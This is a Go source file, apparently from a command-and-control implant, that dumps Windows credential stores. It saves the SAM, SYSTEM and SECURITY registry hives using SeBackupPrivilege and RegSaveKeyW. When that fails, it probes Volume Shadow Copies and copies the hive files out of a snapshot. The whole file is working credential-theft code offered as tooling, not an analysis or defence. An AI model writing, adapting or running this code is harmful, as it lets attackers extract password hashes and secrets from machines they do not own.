//go:build windows

package creds

import (
	"fmt"
	"io"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// DumpSAM saves HKLM\SAM, HKLM\SYSTEM, and HKLM\SECURITY hives to outDir.
func DumpSAM(outDir string) (string, error) {
	var results []string

	privErr := enablePrivilege("SeBackupPrivilege")
	if privErr == nil {
		r, err := dumpSAMRegSave(outDir)
		if err == nil {
			return r, nil
		}
		results = append(results, fmt.Sprintf("[-] RegSaveKeyW failed: %v", err))
	} else {
		results = append(results, fmt.Sprintf("[-] SeBackupPrivilege unavailable: %v", privErr))
	}

	results = append(results, "[*] trying VSS fallback …")
	vssOut, vssErr := dumpSAMVSS(outDir)
	if vssErr == nil {
		results = append(results, vssOut)
		var sb strings.Builder
		for _, r := range results {
			sb.WriteString(r)
			sb.WriteByte('\n')
		}
		return sb.String(), nil
	}
	results = append(results, fmt.Sprintf("[-] VSS fallback failed: %v", vssErr))

	var sb strings.Builder
	for _, r := range results {
		sb.WriteString(r)
		sb.WriteByte('\n')
	}
	return sb.String(), fmt.Errorf("all SAM dump methods exhausted")
}

func dumpSAMRegSave(outDir string) (string, error) {
	type hiveEntry struct {
		root   windows.Handle
		subkey string
		file   string
	}
	hives := []hiveEntry{
		{windows.HKEY_LOCAL_MACHINE, "SAM", outDir + `\sam.save`},
		{windows.HKEY_LOCAL_MACHINE, "SYSTEM", outDir + `\system.save`},
		{windows.HKEY_LOCAL_MACHINE, "SECURITY", outDir + `\security.save`},
	}

	allFailed := true
	var results []string
	for _, h := range hives {
		subKeyPtr, err := windows.UTF16PtrFromString(h.subkey)
		if err != nil {
			results = append(results, fmt.Sprintf("UTF16Ptr(%s): %v", h.subkey, err))
			continue
		}

		var hKey windows.Handle
		const keyRead uint32 = 0x20019
		const keyWow64_64Key uint32 = 0x0100
		if err := windows.RegOpenKeyEx(h.root, subKeyPtr, 0, keyRead|keyWow64_64Key, &hKey); err != nil {
			results = append(results, fmt.Sprintf("RegOpenKeyEx(%s): %v", h.subkey, err))
			continue
		}

		filePtr, _ := windows.UTF16PtrFromString(h.file)
		r, _, e := winsyscall.ProcRegSaveKeyW.Call(
			uintptr(hKey),
			uintptr(unsafe.Pointer(filePtr)),
			0,
		)
		windows.RegCloseKey(hKey)

		if r != 0 {
			results = append(results, fmt.Sprintf("RegSaveKeyW(HKLM\\%s): %v", h.subkey, e))
		} else {
			results = append(results, fmt.Sprintf("[+] saved HKLM\\%s → %s", h.subkey, h.file))
			allFailed = false
		}
	}

	var sb strings.Builder
	for _, r := range results {
		sb.WriteString(r)
		sb.WriteByte('\n')
	}
	if allFailed {
		return sb.String(), fmt.Errorf("RegSaveKeyW failed for all hives")
	}
	return sb.String(), nil
}

func dumpSAMVSS(outDir string) (string, error) {
	const (
		maxShadow = 64
		hivesBase = `\Windows\System32\config\`
	)
	hiveFiles := []struct{ src, dst string }{
		{"SAM", outDir + `\sam.vss`},
		{"SYSTEM", outDir + `\system.vss`},
		{"SECURITY", outDir + `\security.vss`},
	}

	foundN := 0
	for n := maxShadow; n >= 1; n-- {
		probePath := fmt.Sprintf(`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%d%sSAM`, n, hivesBase)
		h, err := openVSSFile(probePath)
		if err == nil {
			windows.CloseHandle(h)
			foundN = n
			break
		}
	}
	if foundN == 0 {
		return "", fmt.Errorf("no readable VSS snapshot found (checked 1..%d)", maxShadow)
	}

	var results []string
	results = append(results, fmt.Sprintf("[*] using HarddiskVolumeShadowCopy%d", foundN))

	anyOK := false
	for _, hf := range hiveFiles {
		src := fmt.Sprintf(`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%d%s%s`, foundN, hivesBase, hf.src)
		if err := vssFileCopy(src, hf.dst); err != nil {
			results = append(results, fmt.Sprintf("[-] copy %s: %v", hf.src, err))
			continue
		}
		results = append(results, fmt.Sprintf("[+] copied %s → %s", hf.src, hf.dst))
		anyOK = true
	}

	var sb strings.Builder
	for _, r := range results {
		sb.WriteString(r)
		sb.WriteByte('\n')
	}
	if !anyOK {
		return sb.String(), fmt.Errorf("VSS copy failed for all hives")
	}
	return sb.String(), nil
}

func openVSSFile(path string) (windows.Handle, error) {
	pathPtr, err := windows.UTF16PtrFromString(path)
	if err != nil {
		return windows.InvalidHandle, err
	}
	h, err := windows.CreateFile(
		pathPtr,
		windows.GENERIC_READ,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_FLAG_BACKUP_SEMANTICS,
		0,
	)
	return h, err
}

func vssFileCopy(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("open %s: %w", src, err)
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("create %s: %w", dst, err)
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}
